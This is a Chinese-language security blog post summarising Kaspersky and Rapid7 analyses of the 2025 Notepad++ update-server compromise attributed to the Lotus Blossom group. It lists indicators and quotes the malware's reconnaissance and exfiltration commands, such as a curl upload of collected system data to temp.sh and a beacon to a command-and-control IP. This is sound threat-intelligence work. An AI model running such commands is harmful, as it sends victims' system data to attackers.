<!DOCTYPE html><html lang="en" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>Notepad++ 更新基礎設施遭攻擊：疑似中國 APT 組織 Lotus 發動供應鏈滲透 | QSWeb3's Technical Blog</title><meta name="author" content="QSWeb3"><meta name="copyright" content="QSWeb3"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="概觀簡介事件2026 年 2 月 2 日由Notepad++的開發人員發布聲明稱 Notepad++ 的更新基礎設施 (update delivery infrastructure) 遭入侵 (參考) 不是 notepad++ 軟體被竄改，而是攻擊者取得對託管環境的存取權限，攔截更新流量並向特定目標推送了惡意安裝程式 簡單講就是針對軟體的自動更新做介入 這是一個供應鏈攻擊 這次攻擊事件目前被歸因可">
<meta property="og:type" content="article">
<meta property="og:title" content="Notepad++ 更新基礎設施遭攻擊：疑似中國 APT 組織 Lotus 發動供應鏈滲透">
<meta property="og:url" content="https://qsweb3.com/notepad-plus-plus-compromised-lotus-blossom-apt/index.html">
<meta property="og:site_name" content="QSWeb3&#39;s Technical Blog">
<meta property="og:description" content="概觀簡介事件2026 年 2 月 2 日由Notepad++的開發人員發布聲明稱 Notepad++ 的更新基礎設施 (update delivery infrastructure) 遭入侵 (參考) 不是 notepad++ 軟體被竄改，而是攻擊者取得對託管環境的存取權限，攔截更新流量並向特定目標推送了惡意安裝程式 簡單講就是針對軟體的自動更新做介入 這是一個供應鏈攻擊 這次攻擊事件目前被歸因可">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="https://qsweb3.com/img/avatar_img.png">
<meta property="article:published_time" content="2026-02-04T15:29:37.000Z">
<meta property="article:modified_time" content="2026-02-05T09:32:22.879Z">
<meta property="article:author" content="QSWeb3">
<meta property="article:tag" content="供應鏈攻擊">
<meta property="article:tag" content="notepad++">
<meta property="article:tag" content="APT">
<meta property="article:tag" content="CN">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://qsweb3.com/img/avatar_img.png"><script type="application/ld+json">{
  "@context": "https://schema.org",
  "@type": "BlogPosting",
  "headline": "Notepad++ 更新基礎設施遭攻擊：疑似中國 APT 組織 Lotus 發動供應鏈滲透",
  "url": "https://qsweb3.com/notepad-plus-plus-compromised-lotus-blossom-apt/",
  "image": "https://qsweb3.com/img/avatar_img.png",
  "datePublished": "2026-02-04T15:29:37.000Z",
  "dateModified": "2026-02-05T09:32:22.879Z",
  "author": [
    {
      "@type": "Person",
      "name": "QSWeb3",
      "url": "https://qsweb3.com"
    }
  ]
}</script><link rel="shortcut icon" href="/img/favicon_img.png"><link rel="canonical" href="https://qsweb3.com/notepad-plus-plus-compromised-lotus-blossom-apt/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//www.google-analytics.com" crossorigin=""/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css"><script>
    (() => {
      
    const saveToLocal = {
      set: (key, value, ttl) => {
        if (!ttl) return
        const expiry = Date.now() + ttl * 86400000
        localStorage.setItem(key, JSON.stringify({ value, expiry }))
      },
      get: key => {
        const itemStr = localStorage.getItem(key)
        if (!itemStr) return undefined
        const { value, expiry } = JSON.parse(itemStr)
        if (Date.now() > expiry) {
          localStorage.removeItem(key)
          return undefined
        }
        return value
      }
    }

    window.btf = {
      saveToLocal,
      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
        const script = document.createElement('script')
        script.src = url
        script.async = true
        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
        script.onload = script.onreadystatechange = () => {
          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
        }
        script.onerror = reject
        document.head.appendChild(script)
      }),
      getCSS: (url, id) => new Promise((resolve, reject) => {
        const link = document.createElement('link')
        link.rel = 'stylesheet'
        link.href = url
        if (id) link.id = id
        link.onload = link.onreadystatechange = () => {
          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
        }
        link.onerror = reject
        document.head.appendChild(link)
      }),
      addGlobalFn: (key, fn, name = false, parent = window) => {
        if (!false && key.startsWith('pjax')) return
        const globalFn = parent.globalFn || {}
        globalFn[key] = globalFn[key] || {}
        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
        parent.globalFn = globalFn
      }
    }
  
      
      const activateDarkMode = () => {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      const activateLightMode = () => {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }

      btf.activateDarkMode = activateDarkMode
      btf.activateLightMode = activateLightMode

      const theme = saveToLocal.get('theme')
    
          theme === 'dark' ? activateDarkMode() : theme === 'light' ? activateLightMode() : null
        
      
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
      }
    
      
    const detectApple = () => {
      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
        document.documentElement.classList.add('apple')
      }
    }
    detectApple()
  
    })()
  </script><script async="async" src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script><script>(adsbygoogle = window.adsbygoogle || []).push({
  google_ad_client: 'ca-pub-7488705562481381',
  enable_page_level_ads: 'true'
});</script><script async="async" src="https://www.googletagmanager.com/gtag/js?id=G-6YSEMCKPN1"></script><script>window.dataLayer = window.dataLayer || []
function gtag(){dataLayer.push(arguments)}
gtag('js', new Date())
gtag('config', 'G-6YSEMCKPN1')
btf.addGlobalFn('pjaxComplete', () => {
  gtag('config', 'G-6YSEMCKPN1', {'page_path': window.location.pathname})
}, 'google_analytics')
</script><script>const GLOBAL_CONFIG = {
  root: '/',
  algolia: undefined,
  localSearch: undefined,
  translate: undefined,
  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false,"highlightFullpage":false,"highlightMacStyle":false},
  copy: {
    success: 'Copy Successful',
    error: 'Copy Failed',
    noSupport: 'Browser Not Supported'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '',
  dateSuffix: {
    just: 'Just now',
    min: 'minutes ago',
    hour: 'hours ago',
    day: 'days ago',
    month: 'months ago'
  },
  copyright: undefined,
  lightbox: 'null',
  Snackbar: undefined,
  infinitegrid: {
    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid/dist/infinitegrid.min.js',
    buttonText: 'Load More'
  },
  isPhotoFigcaption: false,
  islazyloadPlugin: false,
  isAnchor: false,
  percent: {
    toc: true,
    rightside: true,
  },
  autoDarkmode: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: 'Notepad++ 更新基礎設施遭攻擊：疑似中國 APT 組織 Lotus 發動供應鏈滲透',
  isHighlightShrink: false,
  isToc: true,
  pageType: 'post'
}</script><meta name="generator" content="Hexo 7.3.0"></head><body><div id="web_bg" style="background: linear-gradient(to top, rgb(5, 5, 24), rgb(15, 58, 128), rgb(90, 43, 153), rgb(30, 15, 58));;"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img text-center"><img src="/img/avatar_img.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data text-center"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">18</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">29</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">14</div></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> home</span></a></div><div class="menus_item"><span class="site-page group"><i class="fa-fw fas fa-list"></i><span> categories</span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" href="/categories/Web3/"><i class="fa-fw fas fa-bitcoin-sign"></i><span> Web3</span></a></li><li><a class="site-page child" href="/categories/Cybersecurity/"><i class="fa-fw fas fa-shield"></i><span> Cybersecurity</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> tags</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> about</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> link</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url(/img/hero_section.png);"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><span class="site-name">QSWeb3's Technical Blog</span></a><a class="nav-page-title" href="/"><span class="site-name">Notepad++ 更新基礎設施遭攻擊：疑似中國 APT 組織 Lotus 發動供應鏈滲透</span><span class="site-name"><i class="fa-solid fa-circle-arrow-left"></i><span>  Back to Home</span></span></a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> home</span></a></div><div class="menus_item"><span class="site-page group"><i class="fa-fw fas fa-list"></i><span> categories</span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" href="/categories/Web3/"><i class="fa-fw fas fa-bitcoin-sign"></i><span> Web3</span></a></li><li><a class="site-page child" href="/categories/Cybersecurity/"><i class="fa-fw fas fa-shield"></i><span> Cybersecurity</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> tags</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> about</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> link</span></a></div></div><div id="toggle-menu"><span class="site-page"><i class="fas fa-bars fa-fw"></i></span></div></div></nav><div id="post-info"><h1 class="post-title">Notepad++ 更新基礎設施遭攻擊：疑似中國 APT 組織 Lotus 發動供應鏈滲透</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">Created</span><time class="post-meta-date-created" datetime="2026-02-04T15:29:37.000Z" title="Created 2026-02-04 15:29:37">2026-02-04</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">Updated</span><time class="post-meta-date-updated" datetime="2026-02-05T09:32:22.879Z" title="Updated 2026-02-05 09:32:22">2026-02-05</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E8%B3%87%E5%AE%89%E4%BA%8B%E4%BB%B6/">資安事件</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">Word Count:</span><span class="word-count">2.1k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">Reading Time:</span><span>8mins</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">Post Views:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><h1 id="概觀"><a href="#概觀" class="headerlink" title="概觀"></a>概觀</h1><h2 id="簡介事件"><a href="#簡介事件" class="headerlink" title="簡介事件"></a>簡介事件</h2><p>2026 年 2 月 2 日由Notepad++的開發人員發布聲明稱 Notepad++ 的更新基礎設施 (update delivery infrastructure) 遭入侵 (<a target="_blank" rel="noopener" href="https://notepad-plus-plus.org/news/hijacked-incident-info-update/">參考</a>)</p>
<p><span style="color:#FF9AAE;">不是 notepad++ 軟體被竄改，而是攻擊者取得對託管環境的存取權限，攔截更新流量並向特定目標推送了惡意安裝程式</span></p>
<p>簡單講就是針對軟體的自動更新做介入</p>
<p>這是一個供應鏈攻擊</p>
<p>這次攻擊事件目前被歸因可能是跟中國有關的 APT 組織： Lotus Blossom (又稱 Billbug)<br><a target="_blank" rel="noopener" href="https://cybersecuritynews.com/notepad-hack/">參考</a></p>
<h3 id="簡介-notepad"><a href="#簡介-notepad" class="headerlink" title="簡介 notepad++"></a>簡介 notepad++</h3><p>Notepad++ 是一個免費開源的文字編輯器，專為 Windows 設計</p>
<p>台灣蠻多公司都有安裝的</p>
<p>現在很多程式開發的人會使用 VS Code ，但還是有很多早期的工程師愛用 notepad++</p>
<h2 id="攻擊時間"><a href="#攻擊時間" class="headerlink" title="攻擊時間"></a>攻擊時間</h2><p>目前推測為 2025.06 - 2025.12 ，攻擊者控制了 Notepad++ 託管的更新伺服器</p>
<p>目前預估的攻擊時間</p>
<ul>
<li>2025.06 - 2025.09 : 更新伺服器被入侵，攻擊者劫持更新流量，竄改 <code>update.exe</code></li>
<li>2026.02 : notepad++ 團隊釋出 v8.9.1 版本，並更換託管商，正式修復漏洞</li>
</ul>
<h2 id="當前風險高的人"><a href="#當前風險高的人" class="headerlink" title="當前風險高的人"></a>當前風險高的人</h2><ul>
<li>使用的是 8.8.9 之前的 Notepad++ 版本</li>
<li>啟用了自動更新</li>
<li>更新安裝時間在 2025 年 6 月至 12 月之間</li>
</ul>
<h2 id="當前建議措施"><a href="#當前建議措施" class="headerlink" title="當前建議措施"></a>當前建議措施</h2><ul>
<li>從官方網站或 GitHub 升級到最新版本的 Notepad++</li>
<li>企業環境中，驗證更新來源</li>
<li>查看是否有任何從 <code>gup.exe</code> 產生的可疑 process</li>
</ul>
<h1 id="惡意程式分析"><a href="#惡意程式分析" class="headerlink" title="惡意程式分析"></a>惡意程式分析</h1><h2 id="整理卡巴斯基團隊文章"><a href="#整理卡巴斯基團隊文章" class="headerlink" title="整理卡巴斯基團隊文章"></a>整理卡巴斯基團隊文章</h2><p>以下翻譯整理他們<a target="_blank" rel="noopener" href="https://securelist.com/notepad-supply-chain-attack/118708/">文章資料</a></p>
<p>之後有空在自己分析</p>
<hr>
<p>卡巴斯基團隊表示</p>
<ul>
<li>發現共有 3 個攻擊鏈</li>
<li>攻擊的目標<ul>
<li>越南, 澳洲, 薩爾瓦多的個人電腦</li>
<li>菲律賓政府組織</li>
<li>薩爾瓦多金融機構</li>
<li>越南的 IT 業者</li>
</ul>
</li>
</ul>
<h3 id="第一個攻擊鏈-2025-07-2025-08"><a href="#第一個攻擊鏈-2025-07-2025-08" class="headerlink" title="第一個攻擊鏈 - 2025.07 - 2025.08"></a>第一個攻擊鏈 - 2025.07 - 2025.08</h3><p>惡意程式放在: <a href="http://45.76.155[.]202/update/update.exe">http://45.76.155[.]202/update/update.exe</a></p>
<p>如果從 VirusTotal 來看，第一個掃描是來自台灣的使用者，時間是 2025.09.30</p>
<p>從上述 url 下載的程式 SHA1：<code>8e6e505438c21f3d281e1cc257abdbf7223b7f5a</code></p>
<p>主要程式行為：</p>
<ol>
<li>建立一個資料夾： <code>%appdata%\ProShow</code></li>
<li>執行 <code>cmd /c whoami&amp;&amp;tasklist &gt; 1.txt</code> (獲取當前電腦名稱 &#x2F; 使用者名稱 &#x2F; 正在執行的 process)</li>
<li>將第二步驟產生的 1.txt 傳到 <code>temp.sh</code> ，上傳的命令是 <code>curl.exe -F &quot;file=@1.txt&quot; -s https://temp.sh/upload</code></li>
<li>將前一個步驟上傳的 url 傳到 c2 ，上傳命令是 <code>curl.exe --user-agent &quot;https://temp.sh/ZMRKV/1.txt&quot; -s http://45.76.155[.]202</code></li>
<li>將底下 7 個檔案放置到 <code>%appdata%\ProShow</code> 資料夾中</li>
</ol>
<ul>
<li>ProShow.exe（SHA1：defb05d5a91e4920c9e22de2d81c5dc9b95a9a7c）</li>
<li>defscr（SHA1：259cd3542dea998c57f67ffdd4543ab836e3d2a3）</li>
<li>if.dnt（SHA1：46654a7ad6bc809b623c51938954de48e27a5618）</li>
<li>proshow.crs（SHA1：da39a3ee5e6b4b0d3255bfef95601890afd80709）</li>
<li>proshow.phd（SHA1：da39a3ee5e6b4b0d3255bfef95601890afd80709）</li>
<li>proshow_e.bmp（SHA1：9df6ecc47b192260826c247bf8d40384aa6e6fd6）</li>
<li>load（SHA1：06a6a5a39193075734a32e0235bde0e979c27228）</li>
</ul>
<ol start="6">
<li>執行 <code>ProShow.exe</code></li>
</ol>
<p>上述檔案只有 <code>load</code> 是惡意的，其他都是正常的程式</p>
<p>過去一般 APT Group 常見用 Dll hijacking ，但這邊是用一個舊漏洞去執行惡意 payload </p>
<p>裡面包含兩個 shellcode ，其中一個 shellcode 會去下載惡意 payload: <code>https://45.77.31[.]210/users/admin</code> </p>
<p>這是下載 Cobalt Strike Beacon ，其慧根 c2 通訊： <code>cdncheck.it[.]com</code>，並且會用</p>
<ul>
<li>GET: <code>https://45.77.31[.]210/api/update/v1</code></li>
<li>POST: <code>https://45.77.31[.]210/api/FileUpload/submit</code></li>
</ul>
<p>卡巴斯基團隊在 2025.08 觀察到另一個 <code>update.exe</code>(SHA1: 90e677d7ff5844407b9c073e3b7e896e078e11cd)，執行的攻擊鏈是相同的，不同的只有</p>
<ul>
<li>下載 Cobalt Strike URL: <code>https://cdncheck.it[.]com/users/admin</code></li>
<li>Cobalt Strike URL 改設定為<ul>
<li><a href="https://cdncheck.it[.]com/api/update/v1">https://cdncheck.it[.]com/api/update/v1</a></li>
<li><a href="https://cdncheck.it[.]com/api/Metadata/submit">https://cdncheck.it[.]com/api/Metadata/submit</a></li>
</ul>
</li>
</ul>
<p>卡巴斯基團隊表示從 2025.08 過後沒再觀察到使用此種攻擊鏈的案例</p>
<h3 id="第二個攻擊鏈-2025-09"><a href="#第二個攻擊鏈-2025-09" class="headerlink" title="第二個攻擊鏈 - 2025.09"></a>第二個攻擊鏈 - 2025.09</h3><p>下載的 update.exe 位置相同: <code>http://45.76.155[.]202/update/update.exe</code></p>
<ul>
<li>update.exe 的 SHA1 Hash: 573549869e84544e3ef253bdba79851dcde4963a<ul>
<li>執行流程<ul>
<li>透過 shell 執行並將結果上傳到 <code>temp.sh</code></li>
<li>將下一個攻擊 payload 放到硬碟上並啟動</li>
</ul>
</li>
</ul>
</li>
</ul>
<p>攻擊者一開始收集的資料夾改設定為: <code>%APPDATA%\Adobe\Scripts</code> 且收集更多的資料，用的 shell 指令為</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cmd /c &quot;whoami&amp;&amp;tasklist&amp;&amp;systeminfo&amp;&amp;netstat -ano&quot; &gt; a.txt</span><br></pre></td></tr></table></figure>

<p>後續步驟雷同，就是將收集的資料上傳到 <code>temp.sh</code> 之後傳到 <code>http://45.76.155[.]202/list</code></p>
<p>但改了下一個階段的 payload ，改將底下 4 個資料放到 <code>%APPDATA%\Adobe\Scripts</code> 資料夾</p>
<ul>
<li>alien.dll（SHA1：6444dab57d93ce987c22da66b3706d5d7fc226da）</li>
<li>lua5.1.dll（SHA1：2ab0758dda4e71aee6f4c8e4c0265a796518f07d）</li>
<li>script.exe（SHA1：bf996a709835c0c16cce1015e6d44fc95e08a38a）</li>
<li>alien.ini（SHA1：ca4b6fe0c69472cd3d63b212eb805b7f65710d33）</li>
</ul>
<p>上述除了 <code>alien.ini</code> 是惡意的之外，其他都是合法的</p>
<p>之後是透過執行底下指令</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%APPDATA%\%Adobe\Scripts\script.exe %APPDATA%\Adobe\Scripts\alien.ini</span><br></pre></td></tr></table></figure>

<p>這個惡意的 <code>alien.ini</code> 是跟 lua 解釋器有關，裡面具體做的事情:</p>
<ol>
<li>將 shellcode 放到記憶體中</li>
<li>使用 Windows API: <code>EnumWindowStationsW</code> 啟動 Shellcode</li>
</ol>
<p>(題外話：這幾年看到蠻多 APT Group 用 <code>Enum</code> 系列去啟動的)</p>
<p>shellcode 同第一個攻擊鏈，會去相同的 url: <code>https://cdncheck.it[.]com/users/admin</code> 下載 cobalt strike beacon</p>
<p>此 cobalt strike 連接的 url 跟第一個攻擊鏈略有不同:</p>
<ul>
<li><a href="https://cdncheck.it[.]com/api/getInfo/v1">https://cdncheck.it[.]com/api/getInfo/v1</a>  </li>
<li><a href="https://cdncheck.it[.]com/api/FileUpload/submit">https://cdncheck.it[.]com/api/FileUpload/submit</a></li>
</ul>
<p>卡巴研究團隊在 2025.09 又觀察到另一個惡意程式樣本: <code>update.exe</code> (sha1: 13179c8f19fbf3d8473c49983a199e6cb4f318f0)</p>
<ul>
<li>這樣樣本收集受害者電腦資訊的指令略微不同</li>
</ul>
<p>卡巴團隊還有觀察到另一個樣本: <code>update.exe</code>(sha1: 4c9aac447bf732acc97992290aa7a187b967ee2c)<br>這邊列出主要差異</p>
<ul>
<li>上傳受害者資料的位置更改: <code>https://self-dns.it[.]com/list</code></li>
<li>下載 metasploit download 的 url 改為: <code>https://safe-dns.it[.]com/help/Get-Start</code></li>
<li>cobalt strike 的 URL 改為<ul>
<li><a href="https://safe-dns.it[.]com/resolve">https://safe-dns.it[.]com/resolve</a> </li>
<li><a href="https://safe-dns.it[.]com/dns-query">https://safe-dns.it[.]com/dns-query</a></li>
</ul>
</li>
</ul>
<h3 id="第三個攻擊鏈-2025-10"><a href="#第三個攻擊鏈-2025-10" class="headerlink" title="第三個攻擊鏈 - 2025.10"></a>第三個攻擊鏈 - 2025.10</h3><p>更新伺服器的 URL 為: <code>http://45.32.144[.]255/update/update.exe</code> ，會下載惡意程式 <code>update.exe</code>(sha1: d7ffd7b588880cf61b603346a3557e7cce648c93)</p>
<p>這是惡意程式的功能僅是將底下 3 個檔案放到 <code>%appdata%\Bluetooth\</code> 位置</p>
<ul>
<li><code>BluetoothService.exe</code>: (一個合法的可執行檔案)（SHA1：21a942273c14e4b9d3faa58e4de1fd4d5014a1ed）</li>
<li><code>log.dll</code>: 一個惡意 DLL（SHA1：f7910d943a013eede24ac89d6388c1b98f8b3717）</li>
<li><code>BluetoothService</code>: 加密的 shellcode（SHA1：7e0790226ea461bcc9ecd4be3c315ace41e1c122）</li>
</ul>
<p>這次就是常見的攻擊方式</p>
<p>即是透過合法程式 <code>BluetoothService.exe</code> 以 Dll Hijacking 載入惡意 dll : <code>log.dll</code> 去解密 payload: <code>BluetoothService</code> ，最終會執行惡意後門程式：<code>Chrysalis</code></p>
<p>最終的後門程式: Chrysalis  的細節可以參考 <a target="_blank" rel="noopener" href="https://www.rapid7.com/blog/post/tr-chrysalis-backdoor-dive-into-lotus-blossoms-toolkit/">rapid7 的分析文章</a></p>
<p>rapid 7 內容敘述的 c2</p>
<ul>
<li>metasploit downloader url: <code>api.wiresguard.com/users/admin</code></li>
<li>cobalt strike url: <code>api.wiresguard.com/api/FileUpload/submit</code></li>
</ul>
<h3 id="回歸的第二個攻擊鏈-2025-10"><a href="#回歸的第二個攻擊鏈-2025-10" class="headerlink" title="回歸的第二個攻擊鏈 - 2025.10"></a>回歸的第二個攻擊鏈 - 2025.10</h3><p>卡巴斯基團隊表示在 2025.10 有觀察到一個惡意程式的攻擊鏈是第二個的模式</p>
<ul>
<li>下載的惡意程式 URL: <code>http://95.179.213.]0/date.exe</code> (sha1: 821c0cafb2aab0f063ef7e313f64313fc81d46cd)</li>
<li>其餘用的 c2 url 都跟第二個攻擊鏈相同: <code>self-dns.it[.]com</code></li>
</ul>
<p>卡巴斯基研究團隊表示有在 2025.10 看到攻擊者開始更改惡意推送更新的 url 位置<br>使用底下三種：</p>
<ul>
<li><a href="http://95.179.213[.]0/update/install.exe">http://95.179.213[.]0/update/install.exe</a></li>
<li><a href="http://95.179.213[.]0/update/update.exe">http://95.179.213[.]0/update/update.exe</a></li>
<li><a href="http://95.179.213[.]0/update/AutoUpdater.exe">http://95.179.213[.]0/update/AutoUpdater.exe</a></li>
</ul>
<h2 id="整理-Rapid7-分析文章"><a href="#整理-Rapid7-分析文章" class="headerlink" title="整理 Rapid7 分析文章"></a>整理 Rapid7 分析文章</h2><p><a target="_blank" rel="noopener" href="https://www.rapid7.com/blog/post/tr-chrysalis-backdoor-dive-into-lotus-blossoms-toolkit">資料參考來源</a></p>
<h3 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h3><ul>
<li>認為 notepad++ 供應鏈攻擊的主謀是中國 APT 組織: Lotus Blossom (從 2009 年開始活動)<ul>
<li>此 APT 組織的攻擊目標: 集中在東南亞地區，近期也擴展到中美洲，尤其關注政府、電信、航空、關鍵基礎設施和媒體等等</li>
</ul>
</li>
<li>將 Notepad++ 資安事件的最終後門程式命名為：Chrysalis</li>
</ul>
<h3 id="初始存取"><a href="#初始存取" class="headerlink" title="初始存取"></a>初始存取</h3><p>最初的惡意程式 <code>update.exe</code>，源於 c2:<code>95.179.213.0</code> ，此程式實際上是一個 NSIS 安裝程式 (rapid 7 表示 nsis 安裝程式是中國 apt 愛用的)<br>提取出來的 nsis 安裝程式資訊</p>
<ul>
<li>filename: <code>[NSIS].nsi</code> <ul>
<li>SHA1l: 94dffa9de5b665dc51bc36e2693b8a3a0a4cc6b8</li>
<li>最初由荷蘭地區上傳到 VirusTotal (date: 2025.12.10)</li>
</ul>
</li>
<li>filename: <code>BluetoothService.exe</code> (正常程式)<ul>
<li>本名: BDSubWiz.exe，他是 bitdefender 的程式</li>
<li>SHA1: 21a942273c14e4b9d3faa58e4de1fd4d5014a1ed</li>
<li>用以 DLL-Hijacking</li>
</ul>
</li>
<li><code>BluetoothService</code><ul>
<li>加密的 payload</li>
<li>SHA1: 77bfea78def679aa1117f569a35e8fd1542df21f7e00e27f192c907e61d63a2e</li>
</ul>
</li>
<li><code>log.dll</code> <ul>
<li>惡意的 Loader</li>
<li>SHA1: 3bdc4c0637591533f1d4198a72a33426c01f69bd2e15ceee547866f65e26b7ad</li>
</ul>
</li>
</ul>
<p>安裝腳本的執行過程:</p>
<ol>
<li>在 <code>%AppData%</code> 創建一個隱藏資料夾: <code>Bluetooth</code></li>
<li>將檔案都複製到 <code>Bluetooth</code> 資料夾裡面</li>
<li>執行 <code>BluetoothService.exe</code></li>
<li>DLL SideLoading 載入 <code>log.dll</code> 並執行 2 個 export 函數: <code>LogInit</code> 和 <code>LogWrite</code></li>
<li><code>LogInit</code> 函數會將加密的 payload 載到記憶體，並由 <code>LogWrite</code> 函數將其解密執行 shellcode</li>
</ol>
<p>rapid 7 將 shellcode 命名為: <code>Chrysalis</code></p>
<p>shellcode 執行過程:</p>
<ol>
<li>透過寫死的 key : <code>gQ2JR&amp;9;</code> 做自修改 code 來解密出主要程式模組</li>
<li>解密裡面的 config 檔案，使用 RC4 ，KEY: <code>qwhvb^435h&amp;*7</code> ，可以得到 C2 資訊: <code>https://api.skycloudcenter.com/a/chat/s/70521ddf-a2ef-4adf-9cf0-6d8e24aaa821</code></li>
</ol>
<p>這邊 rapid7 表示 c2 的 URL 結構: <code>/a/chat/s/&#123;GUID&#125;</code> 跟 Deepseek API 聊天端點用的格式完全相同，覺得很有趣</p>
<p>推測是想要模仿常規流量來規避檢測</p>
<p>此 C2 在 Rapid 7 分析當下，解析為 : <code>61.4.102.97</code> (馬來西亞)</p>
</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>Author: </span><span class="post-copyright-info"><a href="https://qsweb3.com">QSWeb3</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>Link: </span><span class="post-copyright-info"><a href="https://qsweb3.com/notepad-plus-plus-compromised-lotus-blossom-apt/">https://qsweb3.com/notepad-plus-plus-compromised-lotus-blossom-apt/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>Copyright Notice: </span><span class="post-copyright-info">All articles on this blog are licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> unless otherwise stated.</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/%E4%BE%9B%E6%87%89%E9%8F%88%E6%94%BB%E6%93%8A/">供應鏈攻擊</a><a class="post-meta__tags" href="/tags/notepad/">notepad++</a><a class="post-meta__tags" href="/tags/APT/">APT</a><a class="post-meta__tags" href="/tags/CN/">CN</a></div><div class="post-share"><div class="social-share" data-image="/img/avatar_img.png" data-sites="facebook,twitter"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><a class="pagination-related full-width" href="/My-Experience-at-CyberFire-Foundry-2025-2-Advanced-Malware-Analysis-2/" title="Deep Dive into Advanced Malware Analysis: My Experience at CyberFire Foundry 2025-2"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-right"><div class="info-1"><div class="info-item-1">Next</div><div class="info-item-2">Deep Dive into Advanced Malware Analysis: My Experience at CyberFire Foundry 2025-2</div></div><div class="info-2"><div class="info-item-1">IntroductionCyberFire Foundry is a hands-on cybersecurity training event organized by the U.S. Department of Energy (DOE).The event focuses heavily on practical exercises rather than theoretical lectures, and covers a wide range of cybersecurity domains. This is the official schedule for Foundry 2025-2, which I attended this 